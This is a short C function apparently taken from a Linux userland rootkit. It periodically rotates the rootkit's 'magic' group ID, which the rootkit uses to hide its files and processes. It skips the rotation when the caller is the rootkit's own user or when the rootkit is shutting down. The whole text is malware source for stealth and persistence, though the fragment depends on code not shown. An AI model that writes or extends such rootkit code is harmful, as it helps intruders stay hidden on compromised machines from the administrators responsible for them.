void gidchanger(void){
    if(!initmvbc() || magicusr() || rkprocup() || rknomore())
        return;

    time_t curtime = time(NULL), last, diff;
    last = mvbc->idchangetime;
    diff = curtime - last;
    diff >= GID_CHANGE_MINTIME ? changerkid(curtime) : 0;
}